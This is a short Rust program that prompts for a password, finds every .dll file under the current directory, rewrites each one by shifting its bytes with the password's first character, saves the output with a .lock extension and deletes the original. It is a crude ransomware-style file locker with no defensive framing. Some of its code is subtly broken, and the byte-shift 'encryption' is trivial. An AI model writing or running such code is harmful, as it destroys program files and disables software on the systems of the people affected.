use std::fs::{self, File};
use std::io::{self, Read, Write};
use std::path::{Path, PathBuf};

fn main() -> io::Result<()> {
    let mut password = String::new();
    println!("Enter password:");
    io::stdin().read_line(&mut password)?;
    password = password.trim().to_owned();
    if password.len() < 18 {
        println!("Password must be at least 18 characters long.");
        return Ok(());
    }

    let search_path = Path::new(".").join("**/*.dll");
    for entry in glob::glob(&search_path.to_string_lossy())? {
        if let Ok(path) = entry {
            let mut file = File::open(&path)?;
            let mut contents = Vec::new();
            file.read_to_end(&mut contents)?;

            let file_lock: Vec<u8> = contents
                .iter()
                .map(|byte| byte.wrapping_add(password.as_bytes()[0]))
                .collect();

            let new_path = add_lock_extension(&path)?;
            let mut file = File::create(&new_path)?;
            file.write_all(&file_lock)?;
            fs::remove_file(&path)?;
            println!("Locked file: {:?}", new_path);
        }
    }

    Ok(())
}

fn add_lock_extension(path: &Path) -> io::Result<PathBuf> {
    let mut new_path = path.with_extension("lock");
    Ok(new_path)
}
